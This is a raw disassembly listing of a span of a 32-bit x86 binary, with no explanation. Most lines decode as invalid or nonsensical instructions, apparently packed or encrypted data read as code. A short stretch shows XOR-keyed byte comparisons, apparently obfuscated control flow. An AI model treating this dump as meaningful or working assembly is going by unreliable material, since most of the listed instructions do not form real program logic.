  416a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a67:	nop
  416a68:	cmp    al,0xb3
  416a6a:	fldcw  WORD PTR [eiz*8-0xa187359]
  416a71:	imul   DWORD PTR [ecx+ecx*1+0x44]
  416a75:	(bad)  
  416a76:	mov    esi,0x74459e07
  416a7b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416a7d:	xchg   ebp,eax
  416a7e:	push   ds
  416a7f:	sahf   
  416a80:	call   0x183:0x3e5b35c2
  416a87:	repnz retf 0x32fe
  416a8b:	outs   dx,DWORD PTR ds:[esi]
  416a8c:	mov    esi,0x59f3ad4a
  416a91:	(bad)  
  416a92:	out    0xd6,al
  416a94:	add    esi,DWORD PTR [ecx+0x48]
  416a97:	pop    esp
  416a98:	inc    DWORD PTR [edi+0x2560777d]
  416a9e:	inc    edi
  416a9f:	inc    edi
  416aa0:	rol    DWORD PTR [esi],1
  416aa2:	mov    dl,0xe
  416aa4:	push   edx
  416aa5:	(bad)
  416aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aa9:	ss mov bl,0x23
  416aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aad:	xchg   ecx,eax
  416aae:	cmp    BYTE PTR [edi+0x65],ah
  416ab1:	fs out 0x94,al
  416ab4:	mov    ah,0xb6
  416ab6:	inc    ebx
  416ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab8:	cmp    bl,bl
  416aba:	out    dx,al
  416abb:	mov    ah,0x86
  416abd:	out    dx,eax
  416abe:	inc    eax
  416abf:	ss push ss
  416ac1:	add    DWORD PTR [ebp+0x741125c1],0xffffffc4
  416ac8:	or     BYTE PTR [ecx],ah
  416aca:	xchg   ecx,eax
  416acb:	jae    0x416ae0
  416acd:	push   ebx
  416ace:	ret    
  416acf:	fisub  DWORD PTR [ebx-0x225072e5]
  416ad5:	test   ah,cl
  416ad7:	add    BYTE PTR [edx+0x2d1aa158],cl
  416add:	mov    esp,0xf45e13e4
  416ae2:	jecxz  0x416b59
  416ae4:	and    al,ah
  416ae6:	out    dx,al
  416ae7:	psllw  mm5,mm4
  416aea:	sahf   
  416aeb:	xchg   esi,eax
  416aec:	jo     0x416aed
  416aee:	adc    dl,0x4e
  416af1:	jno    0x416b1f
  416af3:	ds mov ah,0x54
  416af6:	aad    0xf0
  416af8:	outs   dx,DWORD PTR ds:[esi]
  416af9:	cmp    DWORD PTR [esi],ecx
  416afb:	dec    edx
  416afc:	mov    dl,BYTE PTR [esi-0x73]
  416aff:	loope  0x416b6b
  416b01:	in     al,0xee
  416b03:	jns    0x416b28
  416b05:	(bad)  
  416b06:	lea    edi,ds:0xddf8493a
  416b0c:	test   ah,dh
  416b0e:	aaa    
  416b0f:	cmp    eax,ecx
  416b11:	clc    
  416b12:	pop    ebx
  416b13:	daa    
  416b14:	iret   
  416b15:	jp     0x416ac5
  416b17:	jge    0x416af8
  416b19:	xor    edx,ebx
  416b1b:	or     esi,0xffffffec
  416b1e:	(bad)  
  416b1f:	cmp    al,0xb1
  416b21:	cs out 0x7f,al
  416b24:	mov    eax,ds:0x8090a355
  416b29:	leave  
  416b2a:	adc    ah,BYTE PTR [esi-0x54]
  416b2d:	xchg   ecx,eax
  416b2e:	inc    eax
  416b2f:	pop    esp
  416b30:	mov    cl,0xd
  416b32:	add    esi,DWORD PTR [edi-0x6cf95102]
  416b38:	test   BYTE PTR ds:0x6b95090b,0x3f
  416b3f:	jb     0x416af4
  416b41:	gs ds add eax,0xc37f4444
  416b48:	xor    ebx,esi
  416b4a:	sub    eax,0x6aa381c0
  416b4f:	fnstcw WORD PTR [ebp+0x314eaad4]
  416b55:	xor    al,0x8d
  416b57:	(bad)  
  416b58:	mov    ss:0xc05bcef9,al
  416b5e:	push   eax
  416b5f:	rcl    DWORD PTR [ebp+0x42807096],0xd2
  416b66:	mov    eax,gs:0x2b624b6a
  416b6c:	push   esp
  416b6d:	mov    edi,0xa8563442
  416b72:	loopne 0x416b1e
  416b74:	scas   eax,DWORD PTR es:[edi]
  416b75:	pop    ebx
  416b76:	sub    al,0x2e
  416b78:	repnz add esp,DWORD PTR [esi]
  416b7b:	adc    DWORD PTR [ecx-0x53],ebx
  416b7e:	push   0xdcbf4b71
  416b83:	int    0x8b
  416b85:	aas    
  416b86:	pop    es
  416b87:	les    edx,FWORD PTR [esi]
  416b89:	bswap  edi
  416b8b:	(bad)  
  416b8d:	jge    0x416c06
  416b8f:	xchg   ebx,eax
  416b90:	xor    ecx,ecx
  416b92:	jnp    0x416b2f
  416b94:	ja     0x416b7e
  416b96:	dec    ebp
  416b97:	pop    esp
  416b98:	sbb    al,0x0
  416b9a:	lds    esi,FWORD PTR [edx+edi*2-0x3c]
  416b9e:	popf   
  416b9f:	jne    0x416b84
  416ba1:	sub    DWORD PTR [esi],edx
  416ba3:	mov    edx,0xdcb5101a
  416ba8:	dec    edx
  416ba9:	outs   dx,BYTE PTR ds:[esi]
  416baa:	gs sub edi,eax
  416bad:	cmp    dl,BYTE PTR [bp-0x35ab]
  416bb2:	js     0x416ba5
  416bb4:	pusha  
  416bb5:	sahf   
  416bb6:	fmul   DWORD PTR [edx]
  416bb8:	outs   dx,DWORD PTR ds:[esi]
  416bb9:	adc    BYTE PTR [esi-0xad3dbcf],0x10
  416bc0:	cmc    
  416bc1:	inc    esp
  416bc2:	xchg   bl,bl
  416bc4:	jl     0x416be4
  416bc6:	ret    
  416bc7:	inc    esi
  416bc8:	lock push es
  416bca:	inc    esi
  416bcb:	stos   DWORD PTR es:[edi],eax
  416bcc:	loope  0x416beb
  416bce:	aas    
  416bcf:	pop    ecx
  416bd0:	(bad)  
  416bd1:	sbb    DWORD PTR [esi+0x26],ebx
  416bd4:	or     BYTE PTR [edx+0x52],bh
  416bd7:	hlt    
  416bd8:	mov    ch,0xf
  416bda:	mov    edx,DWORD PTR [ebp+0x8]
  416bdd:	xor    edx,eax
  416bdf:	add    edx,esi
  416be1:	jne    0x414733
  416be7:	mov    edx,DWORD PTR [ebp-0xc]
  416bea:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416bf1:	mov    bl,BYTE PTR [ebp-0x1]
  416bf4:	cmp    dl,bl
  416bf6:	je     0x419033
  416bfc:	mov    ecx,DWORD PTR [ebp-0x5c]
  416bff:	mov    edx,DWORD PTR [ebp-0xc]
  416c02:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416c09:	mov    ebx,DWORD PTR [ebp+0xc]
  416c0c:	xor    ecx,eax
  416c0e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  416c15:	jne    0x41b4c6
  416c1b:	mov    ecx,DWORD PTR [ebp-0x5c]
  416c1e:	mov    edx,DWORD PTR [ebp+0xc]
  416c21:	xor    ecx,eax
  416c23:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  416c2b:	mov    edx,DWORD PTR [ebp-0x18]
  416c2e:	xor    edx,eax
  416c30:	add    edx,esi
  416c32:	cmp    ecx,edx
  416c34:	mov    ecx,DWORD PTR [ebp-0x14]
  416c37:	mov    DWORD PTR [ebp+0x8],ecx
  416c3a:	mov    ecx,DWORD PTR [ebp+0x8]
  416c3d:	je     0x421feb
  416c43:	xor    ecx,eax
  416c45:	add    ecx,esi
  416c47:	mov    ecx,0x242ebc9
  416c4c:	je     0x4190bb
  416c52:	mov    edx,DWORD PTR [ebp+0x8]
  416c55:	mov    ebx,DWORD PTR [ebp-0x8]
  416c58:	xor    edx,eax
  416c5a:	jmp    0x418fb9
  416c5f:	test   BYTE PTR fs:[esi],bl
  416c62:	pop    es
  416c63:	sahf   
  416c64:	and    DWORD PTR [edx-0x80],0x235b4cfa
  416c6b:	fs jecxz 0x416c24
  416c6e:	or     dh,BYTE PTR [ecx+0x42]
  416c71:	jl     0x416bf6
  416c73:	cmp    eax,0x7483835e
  416c78:	adc    edx,DWORD PTR [ecx-0x697590b]
  416c7e:	mov    ah,0xd6
  416c80:	mov    ecx,0xc6f78a0e
  416c85:	rcr    BYTE PTR ds:0xc35e38d,0xaa
  416c8c:	and    bl,BYTE PTR [ebp+0x3bd98caf]
  416c92:	shl    DWORD PTR [edx+ebx*2+0x20],cl
  416c96:	xor    al,0x25
  416c98:	pop    ds
  416c99:	(bad)  
  416c9a:	js     0x416ca1
  416c9c:	ror    DWORD PTR [ebx-0x16],0x2d
  416ca0:	or     al,0x92
  416ca2:	or     bl,dh
  416ca4:	ins    BYTE PTR es:[edi],dx
  416ca5:	xchg   BYTE PTR [edx+esi*4-0x1],dl
  416ca9:	push   eax
  416caa:	mov    esi,0xed729349
  416caf:	jo     0x416cb2
  416cb1:	out    dx,al
  416cb2:	add    bl,BYTE PTR [edi-0x652ab943]
  416cb8:	mov    bl,0xaa
  416cba:	xchg   edi,eax
  416cbb:	fnsave [esi-0x4e1bdf20]
  416cc1:	push   ebx
  416cc2:	cmp    eax,0x99131570
  416cc7:	outs   dx,BYTE PTR ds:[esi]
  416cc8:	imul   ebx,DWORD PTR ds:0x883c7643,0xffffffcf
  416ccf:	stos   DWORD PTR es:[edi],eax
  416cd0:	jbe    0x416cb8
  416cd2:	jne    0x416d44
  416cd4:	mov    ah,0x34
  416cd6:	icebp  
  416cd7:	xchg   ebx,eax
  416cd8:	rol    ebp,cl
  416cda:	sbb    BYTE PTR [eax],al
  416cdc:	test   BYTE PTR [edx+0x73],0xe6
  416ce0:	rcr    BYTE PTR [ecx+0x13d11cc2],0x7d
  416ce7:	icebp  
  416ce8:	shl    DWORD PTR [edx-0xb],0x5
  416cec:	ja     0x416c9e
  416cee:	outs   dx,DWORD PTR ds:[esi]
  416cef:	push   esi
  416cf0:	inc    eax
  416cf1:	leave  
  416cf2:	xlat   BYTE PTR ds:[ebx]
  416cf3:	int3   
  416cf4:	mov    ebx,ebp
  416cf6:	dec    edi
  416cf7:	std    
  416cf8:	aas    
  416cf9:	inc    esp
  416cfa:	and    edx,DWORD PTR [edi+edx*2-0x329184d5]
  416d01:	sbb    BYTE PTR [ebx],cl
  416d03:	mov    al,0x5c
  416d05:	sbb    ch,BYTE PTR [edx+0x19e17652]
  416d0b:	jns    0x416d40
  416d0d:	(bad)  
  416d0e:	int    0x7
  416d10:	mov    al,0x19
  416d12:	gs push 0xaf84ae89
  416d18:	sti    
  416d19:	jnp    0x416d07
  416d1b:	sub    esi,esi
  416d1d:	bound  ebp,QWORD PTR [esi-0x2]
  416d20:	xchg   esi,eax
  416d21:	int    0x83
  416d23:	ins    BYTE PTR es:[edi],dx
  416d24:	idiv   DWORD PTR [edx-0x29]
  416d27:	mov    ch,BYTE PTR [ecx]
  416d29:	dec    edx
  416d2a:	fld    TBYTE PTR [ebp+eax*2-0x5a]
  416d2e:	retf   
  416d2f:	ret    0xb0b4
  416d32:	cs cli 
  416d34:	xlat   BYTE PTR ds:[ebx]
  416d35:	pop    esi
  416d36:	jmp    0x7194:0x5807e2cf
  416d3d:	xor    dh,al
  416d3f:	ja     0x416d2c
  416d41:	and    DWORD PTR [ebp+0x7d6638de],ebp
  416d47:	in     eax,0x72
  416d49:	clc    
  416d4a:	inc    edx
  416d4b:	jge    0x416d4c
  416d4d:	fidivr DWORD PTR [eax+0x1d9e28ae]
  416d53:	aam    0x89
  416d55:	cli    
  416d56:	push   esi
  416d57:	or     edx,ebp
  416d59:	jbe    0x416d0e
  416d5b:	jns    0x416da6
  416d5d:	out    0xf4,al
  416d5f:	repz dec ebx
  416d61:	pop    edx
  416d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d63:	test   eax,0x27f46a05
  416d68:	push   edx
  416d69:	lahf   
  416d6a:	xchg   ebp,eax
  416d6b:	xor    BYTE PTR ds:[edx],ah
  416d6e:	push   eax
  416d6f:	repnz sbb eax,0x7a5e174
  416d75:	aaa    
  416d76:	jbe    0x416d0c
  416d78:	xlat   BYTE PTR ds:[ebx]
  416d79:	lock push ebx
  416d7b:	mov    edx,0xfe3bc25b
  416d80:	jae    0x416d36
  416d82:	sub    BYTE PTR [edx-0x35292777],dl
  416d88:	pop    es
  416d89:	dec    esp
  416d8a:	loopne 0x416d15
  416d8c:	add    dl,BYTE PTR ds:0xe97a2214
  416d92:	and    BYTE PTR [edi+0x36f150b8],0x40
  416d99:	xor    al,0x6a
  416d9b:	pop    ss
  416d9c:	dec    ebx
  416d9d:	aaa    
  416d9e:	cmp    DWORD PTR ds:0xb3e0829c,ecx
  416da4:	mov    bl,0x8c
  416da6:	das    
  416da7:	mov    cl,ch
  416da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416daa:	push   eax
  416dab:	sti    
  416dac:	xchg   DWORD PTR [edx],eax
  416dae:	aam    0x99
  416db0:	inc    ecx
  416db1:	mov    ebx,0xe540391a
  416db6:	inc    ebp
  416db7:	test   eax,0xb5e026a7
  416dbc:	int    0xac
  416dbe:	fimul  DWORD PTR [edx]
  416dc0:	push   edx
  416dc1:	cs or  ebp,edx
  416dc4:	mov    DWORD PTR [ecx+ebp*2-0x364ee551],edi
  416dcb:	mov    gs,WORD PTR [edi]
  416dcd:	outs   dx,BYTE PTR ds:[esi]
  416dce:	outs   dx,BYTE PTR ds:[esi]
  416dcf:	jge    0x416e2d
  416dd1:	xlat   BYTE PTR ds:[ebx]
  416dd2:	push   es
  416dd3:	aad    0x94
  416dd5:	fwait
  416dd6:	add    dl,BYTE PTR ds:0x45dd2f4f
  416ddc:	mov    eax,0xacc09ff2
  416de1:	rcl    BYTE PTR [edx+0x4ebd4949],1
  416de7:	jne    0x416e03
  416de9:	jle    0x416e33
  416deb:	mov    cl,0xa4
  416ded:	add    al,0x3e
  416def:	lods   al,BYTE PTR ds:[esi]
  416df0:	jns    0x416e6d
  416df2:	lahf   
  416df3:	and    al,0xcf
  416df5:	adc    eax,0x513d762a
  416dfa:	dec    ebp
  416dfb:	out    dx,eax
  416dfc:	retf   
  416dfd:	push   ebp
  416dfe:	jl     0x416e6e
  416e00:	adc    DWORD PTR [edi+0x3c1f8e33],ebx
  416e06:	mov    bl,BYTE PTR [edi-0x43578bf4]
  416e0c:	or     eax,0xae9438f9
  416e11:	mov    ds:0x637d231b,eax
  416e16:	jge    0x416e44
  416e18:	ins    BYTE PTR es:[edi],dx
  416e19:	pop    ds
  416e1a:	or     ebp,DWORD PTR [esi+0x2c]
  416e1d:	out    dx,al
  416e1e:	int    0x1a
  416e20:	pop    ss
  416e21:	push   esp
  416e22:	popa   
  416e23:	cmp    DWORD PTR [ecx-0x45902c4c],edx
  416e29:	push   ebp
  416e2a:	pop    ecx
  416e2b:	push   esi
  416e2c:	mov    DWORD PTR [ebp+0x387e0f0f],ebx
  416e32:	cwde   
  416e33:	xor    ah,BYTE PTR [ecx-0x93e9ebb]
  416e39:	mov    eax,ds:0x8eac9446
  416e3e:	xchg   edi,eax
  416e3f:	cs mov eax,0xf6247245
  416e45:	sub    esp,DWORD PTR [edx+0x1e]
  416e48:	js     0x416e3c
  416e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4b:	pop    ss
  416e4c:	push   esi
  416e4d:	fmul   DWORD PTR [edx+eax*2-0xcedc0fe]
  416e54:	data16 ins BYTE PTR es:[edi],dx
  416e56:	(bad)  
  416e58:	(bad)  
  416e5a:	xor    BYTE PTR [edx],ah
  416e5c:	adc    al,0x3b
  416e5e:	shr    BYTE PTR [edi+0x4c],1
  416e61:	rol    DWORD PTR [ebx-0x28004d12],1
  416e67:	repz repz mov ecx,0x93d6eb65
  416e6e:	(bad)  
  416e6f:	sub    al,0x64
  416e71:	ret    
  416e72:	jecxz  0x416e59
  416e74:	adc    DWORD PTR [eax-0x71],ebx
  416e77:	fst    DWORD PTR [ebp-0x88d8ef2]
  416e7d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7f:	int    0x80
  416e81:	add    al,0xde
  416e83:	lahf   
  416e84:	dec    ebp
  416e85:	mov    WORD PTR [ecx+0x7edcb9e8],es
  416e8b:	dec    ecx
  416e8c:	mul    DWORD PTR [eax+0x6220b4a]
  416e92:	push   ebp
  416e93:	or     edi,DWORD PTR [ecx-0x15783b0c]
  416e99:	shl    dh,1
  416e9b:	mov    al,0x37
  416e9d:	jns    0x416ed1
  416e9f:	out    dx,al
  416ea0:	imul   ecx,DWORD PTR [esi-0x4926ca66],0xffffff84
  416ea7:	dec    DWORD PTR [edi-0x7f]
  416eaa:	mov    dl,0x27
  416eac:	(bad)  
  416ead:	repz into 
  416eaf:	mov    ds:0xca6fada8,al
  416eb4:	push   eax
  416eb5:	int    0x1b
  416eb7:	add    BYTE PTR [edx],bl
  416eb9:	(bad)  
  416eba:	cs cmp eax,0x796eea13
  416ec0:	adc    bh,0x32
  416ec3:	xor    DWORD PTR [ecx-0x37fba65a],0x5923ef27
  416ecd:	pop    ds
  416ece:	push   edx
  416ecf:	pop    ds
  416ed0:	ds bnd jmp 0x96d6bfb6
  416ed7:	jp     0x416ef6
  416ed9:	loope  0x416ea8
  416edb:	xlat   BYTE PTR ds:[ebx]
  416edc:	inc    edi
  416edd:	jp     0x416f0d
  416edf:	psubsw mm7,QWORD PTR [edi-0x2f]
  416ee3:	bound  ecx,QWORD PTR [edx-0x50bb27dc]
  416ee9:	adc    DWORD PTR [ecx-0x74c25930],0x17960f13
  416ef3:	nop
  416ef4:	push   cs
  416ef5:	or     al,0x8f
  416ef7:	add    eax,0x7f52d5b
  416efc:	pop    ds
  416efd:	(bad)  
  416efe:	mov    esp,0x6d3f9055
  416f03:	sbb    eax,0xa695dbe3
  416f08:	mov    dl,0xc
  416f0a:	(bad)  
  416f0b:	aas    
  416f0c:	ins    BYTE PTR es:[edi],dx
  416f0d:	cmp    ecx,DWORD PTR [ecx+0x5d8a2862]
  416f13:	sbb    eax,0x4586ba33
  416f18:	jmp    DWORD PTR [edi+0x2a25b257]
  416f1e:	ja     0x416ebd
  416f20:	adc    eax,0x99309356
  416f25:	neg    BYTE PTR [esi]
  416f27:	jns    0x416f60
  416f29:	and    BYTE PTR [esp+edx*8-0x3c],dl
  416f2d:	pop    edi
  416f2e:	jbe    0x416fa2
  416f30:	mov    bl,0x41
  416f32:	cmp    al,0xd1
  416f34:	enter  0x48e,0xdb
  416f38:	fisub  DWORD PTR [ecx]
  416f3a:	push   esp
  416f3b:	imul   DWORD PTR [ecx]
  416f3d:	mov    esi,0x86033e84
  416f42:	icebp  
  416f43:	sbb    al,0x31
  416f45:	push   es
  416f46:	popa   
  416f47:	retf   0x749d
  416f4a:	fucom  st(6)
  416f4c:	xchg   esi,eax
  416f4d:	gs mov ch,0xed
  416f50:	and    eax,0xfde8aeab
  416f55:	arpl   WORD PTR [edx+0x72],sp
  416f58:	out    0x3e,al
  416f5a:	retf   0xa537
  416f5d:	or     eax,0x37932cfb
  416f62:	dec    ebp
  416f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f64:	daa    
  416f65:	pusha  
  416f66:	(bad)  
  416f68:	(bad)  
  416f69:	mov    al,ds:0x159ce196
  416f6e:	repz and eax,0x5ea59862
  416f74:	inc    eax
  416f75:	push   ebp
  416f76:	sbb    eax,0x3aabf0b0
  416f7b:	imul   edx,eax,0xfffffff4
  416f7e:	adc    dl,ch
  416f80:	mov    edi,0x29393417
  416f85:	(bad)  
  416f86:	popf   
  416f87:	and    ebx,DWORD PTR [edx-0x6d]
  416f8a:	int    0x65
  416f8c:	daa    
  416f8d:	loopne 0x416f73
  416f8f:	push   ecx
  416f90:	pusha  
  416f91:	jbe    0x416ffd
  416f93:	push   es
  416f94:	ds loope 0x416fe8
  416f97:	add    eax,0x2b9492c7
  416f9c:	mov    ds:0x77f2c154,al
  416fa1:	add    al,0x7e
  416fa3:	in     al,dx
  416fa4:	pop    ds
  416fa5:	mov    dl,0xe5
  416fa7:	sub    ebp,DWORD PTR [edi-0x6e]
  416faa:	fwait
  416fab:	push   edx
  416fac:	shl    BYTE PTR [edx-0x6f4c03c3],0x84
  416fb3:	cmp    BYTE PTR [ebp+eiz*2-0x6e],ah
  416fb7:	adc    edi,DWORD PTR [ebx-0x50]
  416fba:	pusha  
  416fbb:	or     bl,BYTE PTR [eax]
  416fbd:	cwde   
  416fbe:	adc    eax,edx
  416fc0:	jecxz  0x416f81
  416fc2:	cmp    BYTE PTR [edx+0x48],cl
  416fc5:	lahf   
  416fc6:	mov    dl,0xf0
  416fc8:	push   eax
  416fc9:	mov    DWORD PTR [edx-0x3a5a7bf3],esp
  416fcf:	std    
  416fd0:	xlat   BYTE PTR ds:[ebx]
  416fd1:	pop    ds
  416fd2:	loope  0x41700f
  416fd4:	test   DWORD PTR [edx+0x407a37cf],edi
  416fda:	jnp    0x417037
  416fdc:	ret    0x8a16
  416fdf:	pop    ecx
  416fe0:	inc    esi
  416fe1:	or     eax,0xd8e6a0d1
  416fe6:	add    dh,BYTE PTR [ebx+0x74]
  416fe9:	jbe    0x417030
  416feb:	inc    ecx
  416fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fed:	icebp  
  416fee:	or     edx,ebx
  416ff0:	or     eax,0xd02d731b
  416ff5:	test   edx,esi
  416ff7:	jge    0x41705d
  416ff9:	cwde   
  416ffa:	pushw  es
  416ffc:	add    bl,BYTE PTR [ecx]
  416ffe:	inc    esp
  416fff:	lahf   
  417000:	outs   dx,DWORD PTR ds:[esi]
  417001:	xchg   ecx,eax
  417002:	sbb    BYTE PTR [edx+0x1a],bh
  417005:	xchg   esi,eax
  417006:	push   ds
  417007:	lods   eax,DWORD PTR ds:[esi]
  417008:	lds    esi,FWORD PTR [edi-0x6d5f5bd8]
  41700e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41700f:	cwde   
  417010:	unpckhps xmm6,xmm4
  417013:	inc    eax
  417014:	adc    edx,0x90246abc
  41701a:	aas    
  41701b:	xchg   edx,eax
  41701c:	call   0x45f7:0xd34668d1
  417023:	lahf   
  417024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417025:	xor    ebx,DWORD PTR [edx+ebp*1+0x6a9e1fb5]
  41702c:	test   eax,0xc6a37d84
  417031:	rcr    DWORD PTR [esi+0x42],0x58
  417035:	adc    BYTE PTR [ebx+0x6e],bh
  417038:	mov    bl,0x5a
  41703a:	sub    al,0xa2
  41703c:	adc    eax,0x8166a5e8
  417041:	or     al,0xfc
  417043:	push   ecx
  417044:	ds dec esp
  417046:	inc    ebp
  417047:	or     al,0xda
  417049:	scas   al,BYTE PTR es:[edi]
  41704a:	mov    edx,0xcf851aa9
  41704f:	aas    
  417050:	inc    ebp
  417051:	sub    BYTE PTR ds:0x33f6dc66,dl
  417057:	jp     0x416fea
  417059:	and    al,0x4c
  41705b:	clc    
  41705c:	sbb    BYTE PTR [edi-0x26ac1689],bh
  417062:	fsubrp st(5),st
  417064:	outs   dx,BYTE PTR ds:[esi]
  417065:	stc    
  417066:	icebp  
  417067:	add    BYTE PTR [ebx+0x341bef7f],dh
  41706d:	std    
  41706e:	pop    ds
  41706f:	xchg   ebp,eax
  417070:	rcl    DWORD PTR [eax-0x970f07e],1
  417076:	jo     0x417027
  417078:	pop    ss
  417079:	dec    esi
  41707a:	inc    DWORD PTR [esi]
  41707c:	and    al,0xc6
  41707e:	sahf   
  41707f:	call   0x109305be
  417084:	jb     0x417102
  417086:	rcr    BYTE PTR [esi+0x6f],0xa1
  41708a:	mov    eax,ds:0xc46665fd
  41708f:	pusha  
  417090:	popf   
  417091:	push   edx
  417092:	dec    esi
  417093:	sbb    dh,dl
  417095:	push   eax
  417096:	cmp    eax,0x7dbf9e25
  41709b:	ins    BYTE PTR es:[edi],dx
  41709c:	mov    al,dh
  41709e:	hlt    
  41709f:	imul   eax,edx,0xc8943bc8
  4170a5:	paddw  mm5,QWORD PTR [ebp-0x33f0b1dc]
  4170ac:	mov    edx,0xafbaa646
  4170b1:	mov    esi,0xee7e67ff
  4170b6:	fstp   DWORD PTR [ebx]
  4170b8:	jmp    0x6ceebc25
  4170bd:	jge    0x417121
  4170bf:	adc    al,0xdf
  4170c1:	mov    ?,WORD PTR [ecx+0x18]
  4170c4:	push   edi
  4170c5:	or     al,0xd7
  4170c7:	cdq    
  4170c8:	fsub   QWORD PTR [ecx]
  4170ca:	cmc    
  4170cb:	lds    esp,FWORD PTR [ecx-0x25f19918]
  4170d1:	popf   
  4170d2:	mov    cl,0xcb
  4170d4:	inc    esp
  4170d5:	(bad)  
  4170d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d7:	pop    eax
  4170d8:	mov    ds:0x3b72b2b6,al
  4170dd:	inc    ebx
  4170de:	push   ecx
  4170df:	sub    esi,edx
  4170e1:	inc    esi
  4170e2:	int3   
  4170e3:	test   DWORD PTR [esi],edi
  4170e5:	xor    BYTE PTR [esi-0x3e5d794a],ah
  4170eb:	pushf  
  4170ec:	xor    BYTE PTR [edx+0x7f],0x96
  4170f0:	and    al,0x4a
  4170f2:	ins    DWORD PTR es:[edi],dx
  4170f3:	mov    BYTE PTR [ecx],dh
  4170f5:	fsubr  DWORD PTR [edx]
  4170f7:	pop    edx
  4170f8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170fa:	push   esi
  4170fb:	or     DWORD PTR [edi],eax
  4170fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170fe:	pop    esi
  4170ff:	pop    ebx
  417100:	in     al,dx
  417101:	mov    bl,0x8c
  417103:	mov    edx,0xf6582070
  417108:	sbb    bh,BYTE PTR [eax]
  41710a:	gs push esi
  41710c:	ret    
  41710d:	out    0x35,al
  41710f:	cvtdq2ps xmm7,xmm0
  417112:	xchg   ecx,eax
  417113:	ret    
  417114:	or     cl,BYTE PTR [esp+ecx*1+0x7e5248fe]
  41711b:	jge    0x41714a
  41711d:	nop
  41711e:	xchg   edi,eax
  41711f:	pop    edx
  417120:	bound  edi,QWORD PTR [eax-0x7c]
  417123:	clc    
  417124:	xor    ch,ch
  417126:	mov    ah,0xb1
  417128:	mov    al,0xc9
  41712a:	or     eax,0x479065f6
  41712f:	xchg   esp,eax
  417130:	addr16 mov edx,0x6f09c3a8
  417136:	cmc    
  417137:	dec    ebp
  417138:	iret   
  417139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41713a:	push   ds
  41713b:	pushf  
  41713c:	mov    edx,0xfbed1b1f
  417141:	jne    0x417161
  417143:	or     al,0x35
  417145:	dec    eax
  417146:	mov    dl,0x3a
  417148:	aas    
  417149:	add    DWORD PTR [ebx+eax*8+0x2cb0c194],edi
  417150:	sub    eax,0xeff6300a
  417155:	and    ecx,eax
  417157:	cmp    dl,BYTE PTR [edi+ebp*2]
  41715a:	pushf  
  41715b:	jb     0x417153
  41715d:	push   ecx
  41715e:	sub    eax,0x49d31284
  417163:	adc    edx,ecx
  417165:	sbb    esp,DWORD PTR [ebx-0x20]
  417168:	ins    BYTE PTR es:[edi],dx
  417169:	scas   eax,DWORD PTR es:[edi]
  41716a:	lock inc esi
  41716c:	jns    0x41714b
  41716e:	pop    ebp
  41716f:	inc    ebx
  417170:	test   bh,bh
  417172:	(bad)  
  417173:	das    
  417174:	sub    ebp,DWORD PTR [edi]
  417176:	pop    ebp
  417177:	call   0xec8a:0x598cc93e
  41717e:	ror    DWORD PTR [edx+eax*4],0xb5
  417182:	and    edi,edx
  417184:	aam    0x16
  417186:	push   es
  417187:	jae    0x4171a1
  417189:	sahf   
  41718a:	sti    
  41718b:	fisttp WORD PTR [esi-0x25d77b1a]
  417191:	jp     0x41715b
  417193:	push   edi
  417194:	push   ss
  417195:	(bad)  
  417196:	repz mov eax,ds:0xeb0bd48d
  41719c:	jbe    0x4171e5
  41719e:	push   esi
  41719f:	lods   al,BYTE PTR ds:[esi]
  4171a0:	dec    ebp
  4171a1:	pusha  
  4171a2:	call   0xec6d34cc
  4171a7:	loop   0x417172
  4171a9:	sbb    al,0x27
  4171ab:	cdq    
  4171ac:	inc    ecx
  4171ad:	pop    edi
  4171ae:	out    0x5b,al
  4171b0:	inc    esi
  4171b1:	mov    esi,0x74580444
  4171b6:	jb     0x4171b4
  4171b8:	inc    ebp
  4171b9:	dec    edi
  4171ba:	mov    ds:0xb75de4ae,al
  4171bf:	push   es
  4171c0:	inc    esi
  4171c1:	sar    ecx,cl
  4171c3:	mov    al,al
  4171c5:	pop    esi
  4171c6:	data16 mov al,ds:0x8326705
  4171cc:	out    dx,al
  4171cd:	enter  0x6a41,0x8c
  4171d1:	and    eax,0x52c7f42c
  4171d6:	jno    0x417224
  4171d8:	imul   edx,DWORD PTR [edi+0x2c],0x3
  4171dc:	mov    BYTE PTR [ebp+0x30],0xc
  4171e0:	vpaddusw ymm7,ymm5,YMMWORD PTR [eax+ebx*1-0x4d]
  4171e6:	cmp    DWORD PTR [edi],esp
  4171e8:	pop    ds
  4171e9:	dec    ecx
  4171ea:	aas    
  4171eb:	fistp  QWORD PTR [edi]
  4171ed:	mov    esp,ds
  4171ef:	jne    0x41717f
  4171f1:	or     eax,0x9ce71d00
  4171f6:	push   edx
  4171f7:	or     al,0x69
  4171f9:	and    BYTE PTR [edx+0x1c6ffeff],bh
  4171ff:	aaa    
  417200:	pop    es
  417201:	pushf  
  417202:	push   es
  417203:	ret    
  417204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417205:	mov    eax,0xe8f524f2
  41720a:	xchg   ebx,eax
  41720b:	imul   DWORD PTR [edx]
  41720d:	retf   0xcb25
  417210:	adc    al,0xb6
  417212:	sar    DWORD PTR [ecx+0x77],1
  417215:	lds    eax,FWORD PTR [ebp+0x35360b0c]
  41721b:	jecxz  0x4171d4
